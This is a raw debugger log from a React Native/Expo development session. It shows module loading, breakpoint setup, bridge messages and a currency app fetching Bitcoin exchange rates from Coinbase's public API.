{\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"string_decoder.js\",\"path\":\"/string_decoder.js\",\"sourceReference\":1024,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"net.js\",\"path\":\"/net.js\",\"sourceReference\":1025,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"stream.js\",\"path\":\"/stream.js\",\"sourceReference\":1026,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"legacy.js\",\"path\":\"/internal/streams/legacy.js\",\"sourceReference\":1027,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"_stream_readable.js\",\"path\":\"/_stream_readable.js\",\"sourceReference\":1028,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"BufferList.js\",\"path\":\"/internal/streams/BufferList.js\",\"sourceReference\":1029,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"destroy.js\",\"path\":\"/internal/streams/destroy.js\",\"sourceReference\":1030,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"_stream_writable.js\",\"path\":\"/_stream_writable.js\",\"sourceReference\":1031,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"_stream_duplex.js\",\"path\":\"/_stream_duplex.js\",\"sourceReference\":1032,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"_stream_transform.js\",\"path\":\"/_stream_transform.js\",\"sourceReference\":1033,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"_stream_passthrough.js\",\"path\":\"/_stream_passthrough.js\",\"sourceReference\":1034,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"timers.js\",\"path\":\"/timers.js\",\"sourceReference\":1035,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"assert.js\",\"path\":\"/assert.js\",\"sourceReference\":1036,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"net.js\",\"path\":\"/internal/net.js\",\"sourceReference\":1037,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"dns.js\",\"path\":\"/dns.js\",\"sourceReference\":1038,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"dgram.js\",\"path\":\"/dgram.js\",\"sourceReference\":1039,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"socket_list.js\",\"path\":\"/internal/socket_list.js\",\"sourceReference\":1040,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"module.js\",\"path\":\"/module.js\",\"sourceReference\":1041,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"module.js\",\"path\":\"/internal/module.js\",\"sourceReference\":1042,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"url.js\",\"path\":\"/internal/url.js\",\"sourceReference\":1043,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"querystring.js\",\"path\":\"/internal/querystring.js\",\"sourceReference\":1044,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"querystring.js\",\"path\":\"/querystring.js\",\"sourceReference\":1045,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"vm.js\",\"path\":\"/vm.js\",\"sourceReference\":1046,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"fs.js\",\"path\":\"/fs.js\",\"sourceReference\":1047,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"path.js\",\"path\":\"/path.js\",\"sourceReference\":1048,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"constants.js\",\"path\":\"/internal/constants.js\",\"sourceReference\":1049,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"fs.js\",\"path\":\"/internal/fs.js\",\"sourceReference\":1050,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"Loader.js\",\"path\":\"/internal/loader/Loader.js\",\"sourceReference\":1051,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"ModuleMap.js\",\"path\":\"/internal/loader/ModuleMap.js\",\"sourceReference\":1052,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"ModuleJob.js\",\"path\":\"/internal/loader/ModuleJob.js\",\"sourceReference\":1053,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"safe_globals.js\",\"path\":\"/internal/safe_globals.js\",\"sourceReference\":1054,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"DefaultResolve.js\",\"path\":\"/internal/loader/DefaultResolve.js\",\"sourceReference\":1055,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"url.js\",\"path\":\"/url.js\",\"sourceReference\":1056,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"CreateDynamicModule.js\",\"path\":\"/internal/loader/CreateDynamicModule.js\",\"sourceReference\":1057,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"Translators.js\",\"path\":\"/internal/loader/Translators.js\",\"sourceReference\":1058,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"console.js\",\"path\":\"/console.js\",\"sourceReference\":1059,\"origin\":\"read-only core module\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"debuggerWorker.js\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/debuggerWorker.js\",\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":3,\"command\":\"setBreakpoints\",\"success\":true,\"body\":{\"breakpoints\":[{\"id\":1000,\"verified\":false,\"message\":\"Breakpoints set but not yet bound\"}]}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":4,\"command\":\"setBreakpoints\",\"success\":true,\"body\":{\"breakpoints\":[{\"id\":1001,\"verified\":false,\"message\":\"Breakpoints set but not yet bound\"}]}}\nFrom client: setExceptionBreakpoints({\"filters\":[]})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":5,\"command\":\"setExceptionBreakpoints\",\"success\":true}\nFrom client: configurationDone(undefined)\nFrom client: threads(undefined)\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":7,\"command\":\"threads\",\"success\":true,\"body\":{\"threads\":[{\"id\":1,\"name\":\"Node (97268)\"}]}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":6,\"command\":\"configurationDone\",\"success\":true}\nPackager requested runtime to load script from http://localhost:19001/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\nScript http://localhost:19001/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles downloaded to /Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\",\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM82\",\"path\":\"/VM82\",\"sourceReference\":1062,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM83\",\"path\":\"/VM83\",\"sourceReference\":1063,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM84\",\"path\":\"/VM84\",\"sourceReference\":1064,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM85\",\"path\":\"/VM85\",\"sourceReference\":1065,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM86\",\"path\":\"/VM86\",\"sourceReference\":1066,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM87\",\"path\":\"/VM87\",\"sourceReference\":1067,\"origin\":\"read-only content from Node.js\"}}}\nTo RN APP: {\"replyID\":10174,\"result\":null}\nFrom RN APP: {\"id\":10175,\"method\":\"flushedQueue\",\"arguments\":[]}\nFrom RN APP: {\"id\":10176,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"Exponent.nativeUpdatesEvent\",{\"type\":\"downloadFinished\",\"manifest\":{\"id\":\"@anonymous\\/react-omni-9cb6ced6-5bb6-44fa-b007-c3b9cca522c0\",\"privacy\":\"unlisted\",\"logUrl\":\"http:\\/\\/localhost:19000\\/logs\",\"version\":\"0.1.0\",\"assetBundlePatterns\":[\"assets\\/\\/*\"],\"packagerOpts\":{\"lanType\":\"ip\",\"urlRandomness\":\"ix-dyd\",\"hostType\":\"tunnel\",\"dev\":true,\"minify\":false},\"ios\":{\"supportsTablet\":true},\"mainModuleName\":\".\\/node_modules\\/react-native-scripts\\/build\\/bin\\/crna-entry\",\"description\":\"...\",\"loadedFromCache\":false,\"isVerified\":false,\"xde\":true,\"slug\":\"react-omni\",\"debuggerHost\":\"localhost:19001\",\"developer\":{\"projectRoot\":\"\\/Users\\/test\\/Documents\\/dev\\/Projects\\/Omni\\/react\\/native\",\"tool\":\"crna\"},\"env\":{},\"sdkVersion\":\"26.0.0\",\"name\":\"react-omni\",\"bundleUrl\":\"http:\\/\\/localhost:19001\\/.\\/node_modules\\/react-native-scripts\\/build\\/bin\\/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\"}}]]}\nFrom RN APP: {\"id\":10177,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"AppRegistry\",\"runApplication\",[\"main\",{\"rootTag\":51,\"initialProps\":{\"exp\":{\"manifest\":{\"id\":\"@anonymous\\/react-omni-9cb6ced6-5bb6-44fa-b007-c3b9cca522c0\",\"privacy\":\"unlisted\",\"logUrl\":\"http:\\/\\/localhost:19000\\/logs\",\"version\":\"0.1.0\",\"assetBundlePatterns\":[\"assets\\/\\/\"],\"packagerOpts\":{\"lanType\":\"ip\",\"urlRandomness\":\"ix-dyd\",\"hostType\":\"tunnel\",\"dev\":true,\"minify\":false},\"ios\":{\"supportsTablet\":true},\"mainModuleName\":\".\\/node_modules\\/react-native-scripts\\/build\\/bin\\/crna-entry\",\"description\":\"...\",\"loadedFromCache\":false,\"isVerified\":false,\"xde\":true,\"slug\":\"react-omni\",\"debuggerHost\":\"localhost:19001\",\"developer\":{\"projectRoot\":\"\\/Users\\/test\\/Documents\\/dev\\/Projects\\/Omni\\/react\\/native\",\"tool\":\"crna\"},\"env\":{},\"sdkVersion\":\"26.0.0\",\"name\":\"react-omni\",\"bundleUrl\":\"http:\\/\\/localhost:19001\\/.\\/node_modules\\/react-native-scripts\\/build\\/bin\\/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\"},\"appOwnership\":\"expo\",\"initialUri\":\"exp:\\/\\/localhost:19000\",\"shell\":0}}}]]}\nTo RN APP: {\"replyID\":10175,\"result\":\"[[0,0,146,146,146,146,146,90,65],[2,0,6,6,6,6,1,0,0],[[\\\"appStateDidChange\\\"],[2,3],[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},0],[],[]],0]\"}\nTo RN APP: {\"replyID\":10176,\"result\":\"null\"}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"stdout\",\"output\":\"Running application \\\"main\\\" with appParams: {\\\"rootTag\\\":51,\\\"initialProps\\\":{\\\"exp\\\":{\\\"manifest\\\":{\\\"id\\\":\\\"@anonymous/react-omni-9cb6ced6-5bb6-44fa-b007-c3b9cca522c0\\\",\\\"privacy\\\":\\\"unlisted\\\",\\\"logUrl\\\":\\\"http://localhost:19000/logs\\\",\\\"version\\\":\\\"0.1.0\\\",\\\"assetBundlePatterns\\\":[\\\"assets//*\\\"],\\\"packagerOpts\\\":{\\\"lanType\\\":\\\"ip\\\",\\\"urlRandomness\\\":\\\"ix-dyd\\\",\\\"hostType\\\":\\\"tunnel\\\",\\\"dev\\\":true,\\\"minify\\\":false},\\\"ios\\\":{\\\"supportsTablet\\\":true},\\\"mainModuleName\\\":\\\"./node_modules/react-native-scripts/build/bin/crna-entry\\\",\\\"description\\\":\\\"...\\\",\\\"loadedFromCache\\\":false,\\\"isVerified\\\":false,\\\"xde\\\":true,\\\"slug\\\":\\\"react-omni\\\",\\\"debuggerHost\\\":\\\"localhost:19001\\\",\\\"developer\\\":{\\\"projectRoot\\\":\\\"/Users/test/Documents/dev/Projects/Omni/react/native\\\",\\\"tool\\\":\\\"crna\\\"},\\\"env\\\":{},\\\"sdkVersion\\\":\\\"26.0.0\\\",\\\"name\\\":\\\"react-omni\\\",\\\"bundleUrl\\\":\\\"http://localhost:19001/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\\\"},\\\"appOwnership\\\":\\\"expo\\\",\\\"initialUri\\\":\\\"exp://localhost:19000\\\",\\\"shell\\\":0}}}. DEV === true, development-level warning are ON, performance optimizations are OFF\\n\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.[...]\nRunning application \"main\" with appParams: {\"rootTag\":51,\"initialProps\":{\"exp\":{\"manifest\":{\"id\":\"@anonymous/react-omni-9cb6ced6-5bb6-44fa-b007-c3b9cca522c0\",\"privacy\":\"unlisted\",\"logUrl\":\"http://localhost:19000/logs\",\"version\":\"0.1.0\",\"assetBundlePatterns\":[\"assets//\"],\"packagerOpts\":{\"lanType\":\"ip\",\"urlRandomness\":\"ix-dyd\",\"hostType\":\"tunnel\",\"dev\":true,\"minify\":false},\"ios\":{\"supportsTablet\":true},\"mainModuleName\":\"./node_modules/react-native-scripts/build/bin/crna-entry\",\"description\":\"...\",\"loadedFromCache\":false,\"isVerified\":false,\"xde\":true,\"slug\":\"react-omni\",\"debuggerHost\":\"localhost:19001\",\"developer\":{\"projectRoot\":\"/Users/test/Documents/dev/Projects/Omni/react/native\",\"tool\":\"crna\"},\"env\":{},\"sdkVersion\":\"26.0.0\",\"name\":\"react-omni\",\"bundleUrl\":\"http://localhost:19001/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=%2FUsers%2Ftest%2FDocuments%2Fdev%2FProjects%2FOmni%2Freact%2Fnative%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles\"},\"appOwnership\":\"expo\",\"initialUri\":\"exp://localhost:19000\",\"shell\":0}}}. __DEV === true, development-level warning are ON, performance optimizations are OFF\nFrom RN APP: {\"id\":10178,\"method\":\"invokeCallbackAndReturnFlushedQueue\",\"arguments\":[2,[{\"app_state\":\"active\"}]]}\nFrom RN APP: {\"id\":10179,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":0}]]}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM88\",\"path\":\"/VM88\",\"sourceReference\":1068,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM89\",\"path\":\"/VM89\",\"sourceReference\":1069,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"stdout\",\"output\":\"\\ncurrentCurrency: undefined\\nonCurrencyChange: undefined\\nrates: undefined\\nerror: undefined\\nloading: true\\n\\n\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\"},\"line\":113559,\"column\":20}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"loadedSource\",\"body\":{\"reason\":\"new\",\"source\":{\"name\":\"VM90\",\"path\":\"/VM90\",\"sourceReference\":1070,\"origin\":\"read-only content from Node.js\"}}}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"stdout\",\"output\":\"BTC\\n\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\"},\"line\":113322,\"column\":19}}\nBTC\nTo RN APP: {\"replyID\":10177,\"result\":\"[[90,142,142,142,142,142,142,142,142,142,142,142,142,142,142,142,142,142,120,120,120,120,120,120,120],[4,5,5,3,5,5,3,5,3,5,3,5,3,5,3,5,3,3,4,4,4,4,4,4,0],[[[],\\\"057509c2-407e-4481-b2af-a77f93979f64\\\"],[2,\\\"RCTRawText\\\",51,{\\\"text\\\":\\\"1 BTC\\\"}],[3,\\\"RCTText\\\",51,{\\\"fontSize\\\":20,\\\"fontWeight\\\":\\\"200\\\",\\\"color\\\":4293980917,\\\"letterSpacing\\\":6,\\\"accessible\\\":true,\\\"allowFontScaling\\\":true,\\\"ellipsizeMode\\\":\\\"tail\\\"}],[3,[2]],[4,\\\"RCTActivityIndicatorView\\\",51,{\\\"color\\\":4280843159,\\\"animating\\\":true,\\\"hidesWhenStopped\\\":true,\\\"size\\\":\\\"small\\\",\\\"width\\\":20,\\\"height\\\":20}],[5,\\\"RCTView\\\",51,{\\\"alignItems\\\":\\\"center\\\",\\\"justifyContent\\\":\\\"center\\\"}],[5,[4]],[6,\\\"RCTView\\\",51,{\\\"width\\\":\\\"100%\\\",\\\"padding\\\":20}],[6,[5]],[7,\\\"RCTView\\\",51,{\\\"alignItems\\\":\\\"center\\\",\\\"justifyContent\\\":\\\"center\\\",\\\"flex\\\":1}],[7,[3,6]],[8,\\\"RCTView\\\",51,{\\\"height\\\":\\\"100%\\\",\\\"backgroundColor\\\":4281219915}],[8,[7]],[9,\\\"RCTView\\\",51,{\\\"pointerEvents\\\":\\\"box-none\\\",\\\"flex\\\":1}],[9,[8]],[10,\\\"RCTView\\\",51,{\\\"flex\\\":1,\\\"pointerEvents\\\":\\\"box-none\\\"}],[10,[9]],[51,[10]],[\\\"didSendNetworkData\\\"],[\\\"didReceiveNetworkResponse\\\"],[\\\"didReceiveNetworkData\\\"],[\\\"didReceiveNetworkIncrementalData\\\"],[\\\"didReceiveNetworkDataProgress\\\"],[\\\"didCompleteNetworkResponse\\\"],[{\\\"method\\\":\\\"GET\\\",\\\"url\\\":\\\"https://api.coinbase.com/v2/exchange-rates?currency=BTC\\\",\\\"data\\\":{\\\"trackingName\\\":\\\"unknown\\\"},\\\"headers\\\":{},\\\"responseType\\\":\\\"blob\\\",\\\"incrementalUpdates\\\":false,\\\"timeout\\\":0,[...]\nTo RN APP: {\"replyID\":10178,\"result\":\"null\"}\nTo RN APP: {\"replyID\":10179,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[1,2000,1523203741040,false],[1],[1],[1],[1]],34]\"}\nFrom RN APP: {\"id\":10180,\"method\":\"invokeCallbackAndReturnFlushedQueue\",\"arguments\":[67,[17]]}\nTo RN APP: {\"replyID\":10180,\"result\":\"null\"}\nFrom RN APP: {\"id\":10181,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"didReceiveNetworkResponse\",[17,200,{\"cf-ray\":\"4085fef698213d3d-CPH\",\"cf-cache-status\":\"HIT\",\"content-security-policy\":\"default-src 'self' https:\\/\\/www.coinbase.com; child-src 'self' https:\\/\\/www.coinbase.com https:\\/\\/.online-metrix.net https:\\/\\/.wpstn.com https:\\/\\/netverify.com https:\\/\\/platform.twitter.com https:\\/\\/www.google.com\\/recaptcha\\/ https:\\/\\/cdn.plaid.com\\/link\\/ https:\\/\\/.doubleclick.net\\/ blob: https:\\/\\/coinbase.ada.support; connect-src 'self' https:\\/\\/www.coinbase.com https:\\/\\/api.coinbase.com https:\\/\\/api.mixpanel.com https:\\/\\/.online-metrix.net https:\\/\\/api.cloudinary.com https:\\/\\/ott9.wpstn.com\\/live https:\\/\\/api.amplitude.com\\/ static.coinbase.com wss:\\/\\/ws.coinbase.com wss:\\/\\/ws.coinbase.com:443 https:\\/\\/www.coinbase.com\\/api https:\\/\\/coinbase.ada.support\\/api\\/; font-src 'self' https:\\/\\/www.coinbase.com https:\\/\\/assets.coinbase.com\\/ static.coinbase.com; img-src 'self' data: https:\\/\\/www.coinbase.com https:\\/\\/images.coinbase.com https:\\/\\/exceptions.coinbase.com https:\\/\\/coinbase-uploads.s3.amazonaws.com https:\\/\\/s3.amazonaws.com\\/app-public\\/ https:\\/\\/maps.gstatic.com https:\\/\\/ssl.google-analytics.com https:\\/\\/www.google.com https:\\/\\/maps.googleapis.com https:\\/\\/csi.gstatic.com https:\\/\\/www.google-analytics.com https:\\/\\/res.cloudinary.com https:\\/\\/secure.gravatar.com https:\\/\\/i2.wp.com https:\\/\\/*.online-[...]\nFrom RN APP: {\"id\":10182,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"didReceiveNetworkData\",[17,{\"size\":3016,\"blobId\":\"9B8EE6D2-72D6-4340-8CA6-9D07B322DC7C\",\"offset\":0,\"type\":\"application\\/json\",\"name\":\"response.json\"}]]]}\nFrom RN APP: {\"id\":10183,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"didCompleteNetworkResponse\",[17,null,false]]]}\nTo RN APP: {\"replyID\":10181,\"result\":\"null\"}\nTo RN APP: {\"replyID\":10182,\"result\":\"null\"}\nTo RN APP: {\"replyID\":10183,\"result\":\"[[120,120,120,120,120,120,98],[3,3,3,3,3,3,0],[[1],[1],[1],[1],[1],[1],[{\\\"size\\\":3016,\\\"blobId\\\":\\\"9B8EE6D2-72D6-4340-8CA6-9D07B322DC7C\\\",\\\"offset\\\":0,\\\"type\\\":\\\"application/json\\\",\\\"name\\\":\\\"response.json\\\"},\\\"UTF-8\\\",90,91]],39]\"}\nFrom RN APP: {\"id\":10184,\"method\":\"invokeCallbackAndReturnFlushedQueue\",\"arguments\":[90,[\"{\\\"data\\\":{\\\"currency\\\":\\\"BTC\\\",\\\"rates\\\":{\\\"AED\\\":\\\"25847.07\\\",\\\"AFN\\\":\\\"489424.74\\\",\\\"ALL\\\":\\\"741701.91\\\",\\\"AMD\\\":\\\"3376918.05\\\",\\\"ANG\\\":\\\"12558.30\\\",\\\"AOA\\\":\\\"1514866.31\\\",\\\"ARS\\\":\\\"141792.43\\\",\\\"AUD\\\":\\\"9161.50\\\",\\\"AWG\\\":\\\"12561.07\\\",\\\"AZN\\\":\\\"11980.53\\\",\\\"BAM\\\":\\\"11212.79\\\",\\\"BBD\\\":\\\"14074.04\\\",\\\"BCH\\\":\\\"10.76600097\\\",\\\"BDT\\\":\\\"583791.18\\\",\\\"BGN\\\":\\\"11206.72\\\",\\\"BHD\\\":\\\"2653.132\\\",\\\"BIF\\\":\\\"12532933\\\",\\\"BMD\\\":\\\"7037.02\\\",\\\"BND\\\":\\\"9270.31\\\",\\\"BOB\\\":\\\"48625.89\\\",\\\"BRL\\\":\\\"23711.94\\\",\\\"BSD\\\":\\\"7037.02\\\",\\\"BTC\\\":\\\"1.00000000\\\",\\\"BTN\\\":\\\"458508.04\\\",\\\"BWP\\\":\\\"67943.84\\\",\\\"BYN\\\":\\\"13812.69\\\",\\\"BYR\\\":\\\"138126921\\\",\\\"BZD\\\":\\\"14143.21\\\",\\\"CAD\\\":\\\"9006.58\\\",\\\"CDF\\\":\\\"11364787.30\\\",\\\"CHF\\\":\\\"6750.30\\\",\\\"CLF\\\":\\\"156.0811\\\",\\\"CLP\\\":\\\"4255990\\\",\\\"CNH\\\":\\\"44413.01\\\",\\\"CNY\\\":\\\"44303.67\\\",\\\"COP\\\":\\\"19562372.20\\\",\\\"CRC\\\":\\\"3990676.86\\\",\\\"CUC\\\":\\\"7037.02\\\",\\\"CVE\\\":\\\"636498.46\\\",\\\"CZK\\\":\\\"145351.06\\\",\\\"DJF\\\":\\\"1242034\\\",\\\"DKK\\\":\\\"42669.67\\\",\\\"DOP\\\":\\\"348613.97\\\",\\\"DZD\\\":\\\"804753.61\\\",\\\"EEK\\\":\\\"102836.84\\\",\\\"EGP\\\":\\\"124263.22\\\",\\\"ERN\\\":\\\"106188.63\\\",\\\"ETB\\\":\\\"192